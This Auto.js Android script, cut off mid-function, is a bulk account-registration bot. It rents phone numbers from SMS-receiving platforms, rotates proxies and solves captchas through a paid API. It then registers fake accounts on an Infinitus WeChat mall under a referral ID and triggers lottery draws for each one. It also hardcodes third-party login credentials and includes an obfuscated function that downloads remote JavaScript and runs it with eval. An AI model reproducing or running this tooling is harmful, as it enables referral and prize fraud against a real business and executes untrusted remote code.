// 当前脚本来自于http://script.345yun.cn脚本库下载！
"ui";
importClass(android.graphics.drawable.GradientDrawable.Orientation);
importClass(android.graphics.drawable.GradientDrawable);
importClass(java.io.FileOutputStream);
importClass(java.net.URL);
zc()

var color = "#009688";

function logstr(str) {
    var date = new Date();
    var g = random(0, 3)
    var a = date.getHours(); //获取时
    var b = date.getMinutes(); //分
    var c = date.getSeconds(); //秒
    var time = "[" + a + ":" + b + ":" + c + "]"
    let p = [console.verbose, console.warn, console.info, console.error]
    let y = (g);
    p[y](time + ":" + str);
}

function dl() {
    ui.layout(
        <vertical bg="#FFA500">
            <vertical h="auto" align="center" marginTop="100">
                <img layout_gravity="center" src="http://www.autojs.org/assets/uploads/profile/1-profileavatar.jpeg" w="70" h="70" circle="true"/>
            </vertical>
            
            <card w="*" h="250" margin="20" cardCornerRadius="15dp" cardBackgroundColor="#ffffff"
            cardElevation="15dp" gravity="bottom" foreground="?selectableItemBackground">
            
            <vertical>
                <appbar h="30" bg="#ffff00">
                    <text id="toolbar" text="[]网络验证" textColor="#000000"gravity="center" textSize="16"/>
                    <tabs id="tabs"textColor = "#000000"/>
                </appbar>
                
                <linear margin="0 40 0 0">
                    <img w="30" h="30" src="@drawable/ic_person_black_48dp"/>
                    <input id="卡密" w="*" h="40" hint="请输入卡密"  password="true"/>
                </linear>
                
                <linear gravity="center">
                    <vertical>
                        
                        <button id="login" w="250" h="*" text="登录" size="16" style="Widget.AppCompat.Button.Colored"/>
                        <button id="km" w="250" h="*" text="购买卡密" size="16" style="Widget.AppCompat.Button.Colored"/>
                        
                    </vertical>
                    
                    
                    <vertical>
                        
                        
                    </vertical>
                    
                </linear>
                
            </vertical>
            
        </card>
        
        </vertical>
    )
    ui.km.click(function() {
        kmgm();
    }); //卡密购买
    function kmgm() {
        ui.run(() => {
            app.openUrl("https://fakazhu.cn/qIU")
        })
    }

    ui.login.click(function() {
        threads.start(function() {
            var 卡密 = ui.卡密.text();
            var 机器码 = device.getAndroidId();
            var temp = http.post("http://w.eydata.net/E9168D93537BB51E", {
                "SingleCode": 卡密,
                "Ver": "1.0",
                "Mac": 机器码,
                "MacTwo": 机器码

            }).body.string();

            if (temp.length != 32) {
                toastLog("卡密错误")
            } else {
                var temp1 = http.post("http://w.eydata.net/9DAA101A5BEABDB4", {
                    "UserName": 卡密,
                }).body.string();
                toast("登陆成功√")
                logstr("👉👉👉到期时间" + temp1)
                存储.put("卡密", ui.卡密.text()) //登录成功了就存储账号
                ui.run(() => {
                    zc()

                })

            }
        });
    });
} //登录函数结束

function HTML() {
    var url = "<head><meta http-equiv='Content-Type'content='text/html; charset=utf-8'/><meta name='viewport'content='target-densitydpi=device-dpi, width=480px, user-scalable=no'><title>3D立方体</title><style type='text/css'>*{margin:0;padding:0}html,body{height:100%;background:#FFFFFF}.wrap{height:100%;position:relative;-webkit-transform-style:preserve-3d;-webkit-perspective:0px;-moz-transform-style:preserve-3d;-moz-perspective:0px;-webkit-animation:mydhua 5s ease infinite;-moz-animation:mydhua 5s ease infinite}.box{width:200px;height:200px;position:absolute;top:50%;left:50%;margin:-100px 0 0-100px;line-height:200px;text-align:center;font-size:48px;color:white}.box1{-webkit-transform:rotatey(90deg)translatez(-100px);-moz-transform:rotatey(90deg)translatez(-100px);background:rgba(128,0,128,.5)}.box2{-webkit-transform:rotatey(90deg)translatez(100px);-moz-transform:rotatey(90deg)translatez(100px);background:rgba(255,0,255,.5)}.box3{-webkit-transform:rotatex(90deg)translatez(100px);-moz-transform:rotatex(90deg)translatez(100px);background:rgba(255,153,204,.5)}.box4{-webkit-transform:rotatex(90deg)translatez(-100px);-moz-transform:rotatex(90deg)translatez(-100px);background:rgba(0,204,255,.5)}.box5{-webkit-transform:translatez(-100px);-moz-transform:translatez(-100px);background:rgba(153,204,255,.5)}.box6{-webkit-transform:translatez(100px);-moz-transform:translatez(100px);background:rgba(0,255,255,.5)}@-webkit-keyframes mydhua{0%{-webkit-transform:rotateX(0deg)rotateY(0deg)rotateZ(0deg);-webkit-transform-origin:center center}100%{-webkit-transform:rotateX(180deg)rotateY(180deg)rotateZ(180deg);-webkit-transform-origin:center center}}@-moz-keyframes mydhua{0%{-moz-transform:rotateX(0deg)rotateY(0deg)rotateZ(0deg);-webkit-transform-origin:center center}100%{-moz-transform:rotateX(180deg)rotateY(180deg)rotateZ(180deg);-webkit-transform-origin:center center}}</style><body><div class='wrap'><div class='box1 box'></div><div class='box2 box'></div><div class='box3 box'></div><div class='box4 box'></div><div class='box5 box'></div><div class='box6 box'></div></div></body><script type='text/javascript'class='autoinsert'src='js/jquery-1.2.6.min.js'></script><script src='js/snowfall.jquery.js'></script><script>$(document).snowfall('clear');$(document).snowfall({image:'img/huaban.png',flakeCount:30,minSize:0,maxSize:0});</script>"
    ui.webview.loadDataWithBaseURL(null, url, "text/html", "utf-8", null);
    ui.webview.getSettings().setSupportZoom(false);
};


function zc() {

    var MAINUI = ui.inflate(
        <drawer id="drawer">
            <frame id="frame" bg="#ffffff">
                
                <vertical fitsSystemWindows="true">
                    
                    <appbar>
                        <linear id="toolba" clipChildren="false" elevation="0" bg="#ffffff" gravity="center">
                            <img  w="38" h="38" padding="5" margin="8" tint="#555555"  />
                            <text id="toolbar" textColor="#080808" gravity="center" margin="12" layout_weight="1" textSize="19" text="" />
                        </linear>
                    </appbar>
                    
                    <vertical id="Main">
                        <viewpager id="viewpager" bg="#ffffff">
                            <frame>
                                <ScrollView>
                                    <vertical>
                                        <card w="*" h="35" cardBackgroundColor="#FFFFFF" cardCornerRadius="2dp" margin="1 1" cardElevation="1dp" gravity="center_vertical" alpha="1" >
                                            <linear orientation="horizontal">
                                                <spinner textSize="13sp" alpha="1" id="jmpt" entries="接码|无|无|椰子|无" />
                                                <input id="jmzh" textSize="13sp" gravity="center" textColorHint="#A9A9A9" hint="账号"singleLine="true" w="90" />
                                                <input id="jmmm" textSize="13sp" hint="密码" password="true" textColorHint="#A9A9A9"gravity="center" w="90" />
                                                <button id="jmdl" textColor="black" w="*" h="38" style="Widget.AppCompat.Button.Borderless"text="登录" />
                                            </linear>
                                        </card>
                                        <card w="*" h="35" cardBackgroundColor="#FFFFFF" cardCornerRadius="2dp" margin="1 1" cardElevation="1dp" gravity="center_vertical" alpha="1" >
                                            <linear orientation="horizontal">
                                                <spinner textSize="13sp" id="dmpt" entries="联众" w="90" />
                                                <input id="dmzh" textSize="13sp" gravity="center" w="90" textColorHint="#A9A9A9"
                                                singleLine="true"
                                                digits="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567990"
                                                hint="账号" w="70" text="" />
                                                <input id="dmmm" textSize="13sp" hint="密码" password="true" textColorHint="#A9A9A9"  gravity="center" w="90" text=""/>
                                                
                                                
                                                
                                                <button id="dmdl" textColor="black" w="*" h="38" style="Widget.AppCompat.Button.Borderless" text="登录" />
                                            </linear>
                                        </card>
                                        <card w="*" h="35" cardBackgroundColor="#FFFFFF" cardCornerRadius="2dp" margin="1 1" cardElevation="1dp" gravity="center_vertical" alpha="1" >
                                            <linear orientation="horizontal">
                                                <spinner textSize="13sp" id="IP" entries="虚拟IP"/>
                                                <input textSize="10sp"hint="APl/Json链接" id="sp"gravity="center"  w="150" singleLine="true"/>
                                                
                                                <button id="IP测试" textColor="black" w="*" h="38" style="Widget.AppCompat.Button.Borderless"
                                                text="测试" />
                                            </linear>
                                        </card>
                                        <card w="*" h="38" cardBackgroundColor="#FFFFFF" cardCornerRadius="2dp" margin="1 1" cardElevation="1dp" gravity="center_vertical" alpha="1" >
                                            <linear orientation="horizontal">
                                                <input id="xmid"textSize="10sp"  hint="项目id:15111"  w="90dp" h="40dp" textSize="14sp" gravity="center" singleLine="true" />
                                                <input id="yqm"textSize="10sp" hint="填op----un"  w="90dp" h="40dp"  gravity="center" singleLine="true" />
                                                <input id="yqcs"textSize="10sp" hint="邀请次数" w="90dp" h="40dp"  gravity="center" singleLine="true" />
                                                <input id="yc" textSize="10sp"hint="软件延迟" w="80dp" h="40dp"  gravity="center" singleLine="true" />
                                            </linear>
                                        </card>
                                        
                                        <card w="*" h="38" cardBackgroundColor="#FFFFFF" cardCornerRadius="2dp" margin="1 1" cardElevation="1dp" gravity="center_vertical" alpha="1" >
                                            <linear orientation="horizontal">
                                                <checkbox text="内置"/>
                                                <checkbox id="mm" text="随机密码"/>
                                                <checkbox id="nm" text="免码" />
                                                <input id="lz" hint="格式：姓名----身份证"  gravity="center"  textSize="12"textColor="#1E90FF"/>
                                                <img id="rounded_img" src="http://www.autojs.org/assets/uploads/profile/1-profileavatar.jpeg"
                                                w="70" h="30"/>
                                            </linear>
                                        </card>
                                        <card w="*" h="38" cardBackgroundColor="#FFFFFF" cardCornerRadius="2dp" margin="1 1" cardElevation="1dp" gravity="center_vertical" alpha="1" >
                                            <linear orientation="horizontal">
                                                <button id="kszc" textColor="black" marginLeft="10" layout_weight="1" style="Widget.AppCompat.Button.Borderless" text="开始运行" alpha="0.5"/>
                                                <button id="chu" textColor="black"marginRight="10" layout_weight="1" style="Widget.AppCompat.Button.Borderless" text="停止运行" alpha="0.5" />
                                            </linear>
                                        </card>
                                        <card w="*" h="400" cardBackgroundColor="#FFFFFF"  cardCornerRadius="2dp" margin="1 1" cardElevation="1dp" gravity="center_vertical" alpha="1" >
                                            <linear orientation="horizontal">
                                                <text textSize="16sp" text=""/>
                                                <com.stardust.autojs.core.console.ConsoleView id="console" h="*" textSize="10"/>
                                            </linear>
                                        </card>
                                        
                                        
                                        
                                    </vertical>
                                    
                                </ScrollView>
                                
                                
                                
                            </frame>
                            //右滑界面内容东西放在这里
                            
                            <vertical>
                                
                                <horizontal>
                                    
                                    <card bg="#ff00bfff" h="600" margin="5 3"  bg="#FFFFFF" w="350" cardCornerRadius="1dp"cardElevation="3dp" gravity="center">
                                        <webview h ="*" w="400" id="webview"/>
                                        <horizontal w="*">
                                            
                                            <list id="lbk">
                                                <vertical>
                                                    <horizontal>
                                                        //
                                                        <text id="wb_sjhm" textSize="11sp" textColor="#000000" w="35"h="*"text="{{name}}"margin="0 2"gravity="center"/>
                                                        //
                                                        <text id="wb_zcmm" textSize="11sp" textColor="#000000" w="1"h="*"text="{{age}}"margin="0 2"gravity="center"/>
                                                        //
                                                        <text id="wb_jymm" textSize="11sp" textColor="#000000" w="180"h="*"text="{{pa}}"margin="5 2"gravity="center"/>
                                                        //
                                                        <text id="wb_zt" textSize="11sp" textColor="#000000" w="100"h="*"text="{{zz}}"margin="0 2"gravity="center"/>
                                                        //
                                                        <text id="zt" textSize="11sp" textColor="#000000" w="13"h="*"text="{{z}}"margin="0 2"gravity="center"/>
                                                        //
                                                    </horizontal>
                                                </vertical>
                                            </list>
                                            
                                        </horizontal>
                                        
                                    </card>
                                    
                                </horizontal>
                                
                                <text text=" 项目群868629226"   gravity="center" textColor="#000000"    h="40"textSize="10" />
                                
                                
                                
                                
                                
                                
                            </vertical>
                        </viewpager>
                        
                    </vertical>
                    
                </vertical>
                
            </frame>
            <vertical layout_gravity="left" bg="#ffffff" w="280">
                <img w="280" h="380" scaleType="fitXY" src="https://i.loli.net/2021/08/19/fbUw5rVg8hsxFEL.jpg"/>
                
                <list id="menu">
                    <horizontal bg="?selectableItemBackground" w="*">
                        <img w="50" h="50" padding="16" src="{{this.icon}}" tint="#000000"/>
                        <text textColor="black" textSize="15sp" text="{{this.title}}" layout_gravity="center"/>
                    </horizontal>
                    
                    
                </list>
            </vertical>
            
        </drawer>

    );


    files.createWithDirs("/sdcard/软件/私人订制/土淘金数据.txt")
    ui.setContentView(MAINUI), HTML()
    ui.console.setConsole(runtime.console);
    var resource = context.getResources();

    logstr("本软件仅供参考学习，请勿用于非法操作!")
    logstr("项目交流群:868629226")


    ui.menu.setDataSource([{
            title: "联系作者",
            icon: "@drawable/ic_android_black_48dp"
        },
        {
            title: "加入项目群",
            icon: "@drawable/ic_settings_black_48dp"
        },
        {
            title: "交流群",
            icon: "@drawable/ic_favorite_black_48dp"
        },
        {
            title: "工具箱",
            icon: "@drawable/ic_stars_black_48dp"
        },
        {
            title: "退出",
            icon: "@drawable/ic_exit_to_app_black_48dp"
        }
    ]);
    ui.menu.on("item_click", item => {
        switch (item.title) {
            case "交流群":
                加群1()
                break;
            case "联系作者":
                app.openUrl("http://am666.myltd.ltd/")
                //toast("已复制下载链接");
                break;
            case "工具箱":
                app.openUrl("https://wwr.lanzoui.com/b02c9es9a")
                break;
            case "加入项目群":
                加群();
                break;
            case "退出":
                ui.finish();
                break;

        }
    })

    let gradientDrawable = new GradientDrawable()
    let colorArr = [colors.GREEN, colors.TRANSPARENT]
    gradientDrawable.setCornerRadius(30);
    gradientDrawable.setStroke(5, colors.parseColor("#000000"));
    gradientDrawable.setOrientation(GradientDrawable$Orientation.LEFT_RIGHT);

    function logstr(str) {
        var date = new Date();
        var g = random(0, 3)
        var a = date.getHours(); //获取时
        var b = date.getMinutes(); //分
        var c = date.getSeconds(); //秒
        var time = "[" + a + ":" + b + ":" + c + "]"
        let p = [console.verbose, console.warn, console.info, console.error]
        let y = (g);
        p[y](time + ":" + str);
    }
    try {
        ui.console.setConsole(runtime.console);
        // 设置输入框颜色
        ui.console.input.setTextColor(colors.BLACK);
        // 隐藏输入框
        ui.console.setInputEnabled(false);
        // 自定义日志颜色
        ui.console.setColor("D", "#00BFA5");
    } catch (e) {
        // 设置控制台字体颜色


        c.put(Log.VERBOSE, new java.lang.Integer(colors.parseColor("#bdbdbd")));
        c.put(Log.DEBUG, new java.lang.Integer(colors.parseColor("#795548")));
        c.put(Log.INFO, new java.lang.Integer(colors.parseColor("#1de9b6")));
        c.put(Log.WARN, new java.lang.Integer(colors.parseColor("#b71c1c")));
        c.put(Log.ERROR, new java.lang.Integer(colors.parseColor("#673ab7")));
        c.put(Log.ASSERT, new java.lang.Integer(colors.parseColor("#b71c1c")));
        ui.console.setColors(c);


    }


    function yks() {
        toast("登录成功√")
        var temp = http.get("http://www.dmoe.cc/random.php?return=json", {
            "headers": {
                "Host": "www.dmoe.cc",
                "cache-control": "max-age=0",
                "upgrade-insecure-requests": "1",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; V2065A Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36",
                "sec-fetch-user": "?1",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                "dnt": "1",
                "x-requested-with": "mark.via",
                "sec-fetch-site": "none",
                "sec-fetch-mode": "navigate",
                "referer": "https://blog.csdn.net/SectSnow/article/details/115835711",
                "accept-encoding": "gzip, deflate",
                "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
            }
        }).body.json();
        var url = temp.imgurl
        ui.web1.loadUrl("https://obohe.com/i/2021/08/21/jp2wa.jpg")
        ui.web.loadUrl(url)

    }


    function 加群() {
        threads.start(function() {
            app.startActivity({
                action: "android.intent.action.VIEW",
                data: "mqqapi://card/show_pslcard?src_type=internal&version=1&uin=1057305032&card_type=group&source=qrcode",
                packageName: "com.tencent.mobileqq",
            })
        });

    }

    function 加群1() {
        threads.start(function() {
            app.startActivity({
                action: "android.intent.action.VIEW",
                data: "mqqapi://card/show_pslcard?src_type=internal&version=1&uin=1142272503&card_type=group&source=qrcode",
                packageName: "com.tencent.mobileqq",
            })
        });
    }
    //\*********开始运行**********
    ui.kszc.click(function() {
        threads.start(function() {
            var xmid = ui.xmid.text()
            var yqcs = ui.yqcs.text()
            var yc = ui.yc.text()
            var zw = ui.sp.text();
            var dmzh = ui.dmzh.text()
            var dmmm = ui.dmmm.text()
            var yqm = ui.yqm.getText().toString()
            var IP = ui.IP.getSelectedItemPosition()
            var 现行中 = ui.jmpt.getSelectedItemPosition()
            var token = 接受token.blockedGet();
            for (var k = 1; k <= yqcs; k++) {
                logstr("————第" + k + "次邀请————")
                if (IP == 0) {
                    logstr("☞当前选择虚拟ip")
                } else if (IP == 1) {
                    //logstr("当前选择熊猫代理")
                    熊猫(zw) //调用函数
                } else if (IP == 2) {
                    浪七代理(zw)
                } else if (IP == 4) {
                    虚拟IP()
                }
                if (ui.mm.checked) {
                    var mm = 随机()
                    logstr("获取到密码：" + mm)
                } else {
                    var mm = "qwer1234"
                    logstr("获取到密码：" + mm)
                }

                if (现行中 == 0) {
                    var 手机号1 = 获取手机号(现行中, xmid, token) //取号
                    var 手机号 = 手机号1.phone
                    var mid = 手机号1.requestid
                    var mid1 = 手机号1.requestid
                    if (手机号1 == -1) {
                        gx("❌", "", "", "获取手机号失败!", "")
                        logstr("手机号获取失败")
                        continue;
                    } else {
                        logstr("获取到手机号：" + 手机号)
                    }
                } else {

                    var 手机号 = 获取手机号(现行中, xmid, token)

                    if (手机号 == -1) {
                        释放(token, xmid, 手机号)
                        cr("❌", "", "", "获取手机号失败!", "")
                        logstr("手机号获取失败")
                        continue;
                    } else {
                        logstr("获取到手机号：" + 手机号)
                    }
                }

                var a = 发送验证码(手机号, yqm, token, xmid)
                if (a == -1) {
                    
                    释放(token)
                    continue;
                }
                var yzm = 获取验证码(现行中, 手机号, xmid, token, mid, mid1)
                if (yzm == 1) {
                    gx("❌", "", 手机号, "获取验证码失败!", "")
                    logstr("获取验证码已超时！")
                    continue;
                }

                var p = 注册(手机号, yzm, yqm);

                sleep(1000 * yc)

            }
            logstr("脚本已停止运行👉团队")
        })
    });








    function 判断新老(手机号, yzm, xmid, token) {
        var temp = http.get("http://m.322meta.art/api/index/captcha_img?uuid=SEfa3FRzMbjnDSSzmA", {
            "headers": {
                "Host": "m.322meta.art",
                "Connection": "keep-alive",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; V2065A Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4227 MMWEBSDK/20220303 Mobile Safari/537.36 MMWEBID/3257 MicroMessenger/8.0.21.2120(0x28001557) Process/toolsmp WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64",
                "Accept": "image/avif,image/webp,image/wxpic,image/tpg,image/apng,image/*,*/*;q=0.8",
                "X-Requested-With": "com.tencent.mm",
                "Referer": "http://m.322meta.art/h5/",
                "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
            }
        })
        var 编码为图片 = images.fromBytes(temp.body.bytes())
        var 编码为base64 = images.toBase64(编码为图片)
        var tjdm = http.post("http://api.ttshitu.com/predict", {
            "username": "am6666",
            "password": "xujiale12314",
            "typeid": "3",
            "image": 编码为base64
        }).body.json();
        var tpm = tjdm.data.result
        //log(yzm)
        if (tjdm.code == 0) {
            logstr("图片码结果为," + tjdm.data.result)

        } else {
            logstr("识别失败")
        }

        var temp = http.post("http://m.322meta.art/api/sms/send", {
            "mobile": "17009003413",
            "event": "register",
            "captcha": yzm,
            "uuid": "SEfa3FRzMbjnDSSzmA"
        }, {
            "headers": {
                "Host": "m.322meta.art",
                "Connection": "keep-alive",
                "Content-Length": "70",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; V2065A Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4227 MMWEBSDK/20220303 Mobile Safari/537.36 MMWEBID/3257 MicroMessenger/8.0.21.2120(0x28001557) Process/toolsmp WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64",
                "content-type": "application/x-www-form-urlencoded",
                "Accept": "*/*",
                "Origin": "http://m.322meta.art",
                "X-Requested-With": "com.tencent.mm",
                "Referer": "http://m.322meta.art/h5/",
                "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
            }
        }).body.json();

        if (temp.code != "0") {
            logstr("新号☞开始注册~")
            return 1
        } else {
            var 德芙sf = http.get("http://api.my531.com/Cancel/?token=" + token + "&id=" + xmid + "&phone=" + 手机号 + "&type=json").body.json();
            if (德芙sf.message == 'ok') {
                logstr("释放号码成功")
            } else {
                //-logstr("释放号码失败")
            }
            logstr("登录失败☞新号")
            return temp
        }
    }

    function 发送验证码(手机号, yqm, token, xmid) {
        var temp = http.postJson("https://ecp-mall-api.infinituscloud.com.cn/mall/member/login/check/phone", {
            "phone": 手机号
        }, {
            "headers": {
                "Host": "ecp-mall-api.infinituscloud.com.cn",
                "Connection": "keep-alive",
                "Content-Length": "23",
                "content-type": "application/json;charset=utf-8",
                "X-Tingyun": "c=B|0CCx_3ChWr0",
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.39(0x18002733) NetType/WIFI Language/zh_CN",
                "Referer": "https://servicewechat.com/wx7bb6f3b8f0ad2ae8/394/page-frame.html"
            }
        }).body.json();
        
        if (temp.data == true) {
            log("老号，跳过")
            return -1
            
            
        }else{



        var temp = http.post("https://goauth.infinitus.com.cn/encrySendSms", {
            "terminalType": "WEAPP",
            "mobile": 手机号,
            "smsType": "REGISTER",
            "ticket": "",
            "randstr": "",
            "captchaAppId": "2023044384"
        }, {
            "headers": {
                "Host": "goauth.infinitus.com.cn",
                "Connection": "keep-alive",
                "Content-Length": "95",
                "X-Tingyun": "c=B|0CCx_3ChWr0",
                "Authorization": "Basic ZWNwLXdlYXBwOnBCbjVXZVYyQ0dCc2hQR3czanoxQmFhWTlKUEtYd2hR",
                "content-type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.39(0x18002733) NetType/WIFI Language/zh_CN",
                "Referer": "https://servicewechat.com/wx7bb6f3b8f0ad2ae8/394/page-frame.html"
            }
        }).body.json();
        if (temp.success == true) {
            logstr(手机号 + "|发送验证码成功✔")
            cr("√", "", 手机号, "发送成功", "")
        } else {
            logstr(temp)
            gx("❌", "", 手机号, "发送失败" + "")
        }
        
        }

    }

    function 注册(手机号, yzm, yqm) {
        try {
            var op = yqm.split("----")[0]
            var un = yqm.split("----")[1]

            var temp = http.postJson("https://ecp-mall-api.infinituscloud.com.cn/mall/member/login/phone/register", {
                "randomCode": yzm,
                "phone": 手机号,
                "appEntry": 0,
                "appSource": "SELF",
                "friendDealerNo": "",
                "shareDistinctId": "",
                "utmCampaign": "",
                "utmContent": "",
                "utmMedium": "",
                "utmSource": "",
                "utmTerm": "",
                "appId": "wx7bb6f3b8f0ad2ae8",
                "recentSharers": "",
                "unionId": un
            }, {
                "headers": {
                    "Host": "ecp-mall-api.infinituscloud.com.cn",
                    "Connection": "keep-alive",
                    "Content-Length": "283",
                    "content-type": "application/json;charset=utf-8",
                    "X-Tingyun": "c=B|0CCx_3ChWr0",
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.39(0x18002733) NetType/WIFI Language/zh_CN",
                    "Referer": "https://servicewechat.com/wx7bb6f3b8f0ad2ae8/394/page-frame.html"
                }
            }).body.json();
            log(temp);
            var userName = temp.data.userName
            var temp = http.post("https://goauth.infinitus.com.cn/oauth/token", {
                "randomCode": yzm,
                "userName": userName,
                "loginType": "wechat_phone_open_id",
                "grant_type": "wechat",
                "terminalType": "WEAPP",
                "openId": op,
                "unionId":un,
                "wxAppId": "wx7bb6f3b8f0ad2ae8"
            }, {
                "headers": {
                    "Host": "goauth.infinitus.com.cn",
                    "Connection": "keep-alive",
                    "Content-Length": "210",
                    "X-Tingyun": "c=B|0CCx_3ChWr0",
                    "Authorization": "Basic ZWNwLXdlYXBwOnBCbjVXZVYyQ0dCc2hQR3czanoxQmFhWTlKUEtYd2hR",
                    "content-type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.39(0x18002733) NetType/WIFI Language/zh_CN",
                    "Referer": "https://servicewechat.com/wx7bb6f3b8f0ad2ae8/394/page-frame.html"
                }
            }).body.json();
            log(temp);
            var access_token = temp.access_token
            var temp = http.get("https://ecp-mall-api.infinituscloud.com.cn/mall/mall/lottery/clickDraw?activityNo=CJ20240125001&type=04", {
                "headers": {
                    "Host": "ecp-mall-api.infinituscloud.com.cn",
                    "Connection": "keep-alive",
                    "X-Tingyun": "c=B|0CCx_3ChWr0",
                    "content-type": "application/json",
                    "Authorization": "Bearer " + access_token,
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.39(0x18002733) NetType/WIFI Language/zh_CN",
                    "Referer": "https://servicewechat.com/wx7bb6f3b8f0ad2ae8/394/page-frame.html"
                }
            }).body.json();
            if (temp.success == true) {
                logstr("抽奖成功|☞☞☞" + temp.data.awardName)
                gx("√", "", 手机号, temp.data.awardName, "")
            } else {
                log(temp)
                gx("❌", "", 手机号, temp.msg, "")
            }
        } catch (e) {
            log(temp)
            gx("❌", "", 手机号, temp.msg, "")
        }

    }

    ui.IP测试.click(function() {
        var zw = ui.sp.text()
        var IP = ui.IP.getSelectedItemPosition()
        threads.start(function() {
            if (IP == 0) {
                虚拟IP()
            } else if (IP == 1) {
                //logstr("当前选择熊猫代理")
                熊猫(zw) //调用函数
            } else if (IP == 2) {
                浪七代理(zw)
            } else if (IP == 4) {
                虚拟IP()
            }
        })
    })





    function 随机() {
        var item1 = ["A", 'B', "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", ]
        var item2 = ["a", "b", "c", "d", "e", "d", "e", "f", "g", "h", "i", "k", "j", "m", "n", "o", "p", "r", "s", "t", "u", "v", "w", "x", "y", "z", ]
        var item3 = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", ]
        var item4 = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", ]
        var item5 = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", ]
        var item6 = ["a", "b", "c", "d", "e", "d", "e", "f", "g", "h", "i", "k", "j", "m", "n", "o", "p", "r", "s", "t", "u", "v", "w", "x", "y", "z", ]
        var item7 = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", ]
        var item8 = ["A", 'B', "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", ]
        var item1 = item1[Math.floor(Math.random() * item1.length)];
        var item2 = item2[Math.floor(Math.random() * item2.length)];
        var item3 = item3[Math.floor(Math.random() * item3.length)];
        var item4 = item4[Math.floor(Math.random() * item4.length)];
        var item5 = item5[Math.floor(Math.random() * item5.length)];
        var item6 = item6[Math.floor(Math.random() * item6.length)];
        var item7 = item7[Math.floor(Math.random() * item7.length)];
        var item8 = item8[Math.floor(Math.random() * item8.length)];
        var 密码 = item1 + item2 + item3 + item4 + item5 + item6 + item7 + item8;
        return 密码
    };



    var item = [{
        name: "序号",
        age: "",
        pa: "手机号",
        zz: "运行状态",
        z: ""
    }];
    ui.lbk.setDataSource(item);

    function cr(a, b, c, d, z) {
        item.push({
            name: a,
            age: b,
            pa: c,
            zz: d,
            z: z
        });

    };
    //更新表单
    function gx(a, b, c, d, z) {

        item.splice(item.length - 1, 1, {
            name: a,
            age: b,
            pa: c,
            zz: d,
            z: z
        });
    }

    function httpProxy(IP地址, 数字类型转换) {
        //端口号必须为 数字类型   
        var Proxy = java.net.Proxy;
        var InetSocketAddress = java.net.InetSocketAddress;
        var okhttp = new Packages.okhttp3.OkHttpClient.Builder().proxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(IP地址, 数字类型转换)));
        http.__okhttp__.muteClient(okhttp);
    }

    function canclhttpProxy() {
        http.__okhttp__.muteClient(new Packages.okhttp3.OkHttpClient.Builder().proxy(java.net.Proxy.NO_PROXY));
    };

    function ua() {
        var _0x494d55 = {
            'UIAOI': function(_0x1a7952, _0x35a606) {
                return _0x1a7952(_0x35a606);
            },
            'GvQKZ': 'https://gitee.com/autolucky/register_machine/raw/master/User-Agent.js',
            'BJvgu': function(_0x27afd5, _0x45ddf2, _0x4129bc) {
                return _0x27afd5(_0x45ddf2, _0x4129bc);
            }
        };
        var _0x2dc0cd = _0x494d55['UIAOI'](eval, http['get'](_0x494d55['GvQKZ'])['body']['string']());
        return _0x2dc0cd[_0x494d55['BJvgu'](random, 0x0, 0x3e7)];
    }

    ui.chu.click(function() {
        threads.start(function() {
            threads.shutDownAll();
            console.clear()
            logstr("己停止运行")
        });
    });

    function 释放(token) {
        var l = http.get("http://cf.do668.com:81/api/free_mobile?token=" + token).body.string();
    };
    var 接受token = threads.disposable(); //接受token
    //************接码登录************
    ui.jmdl.click(function() {
        threads.start(function() {
            var 现行中 = ui.jmpt.getSelectedItemPosition()
            var jmzh = ui.jmzh.text()
            var jmmm = ui.jmmm.text()
            接码登录(现行中, jmzh, jmmm);

        })
    })

    function 接码登录(现行中, jmzh, jmmm) {
        if (现行中 == 1) {
            var 登录 = http.get("http://api.my531.com/Login/?username=" + jmzh + "&password=" + jmmm).body.string();
            //  log(登录)
            var token = 登录.split("|")[1]
            log(token)
            var jmtoken = token;
            if (登录.split("|")[0] == 1) {
                存储.put("jmzh", ui.jmzh.text()) //登录成功了就存储账号
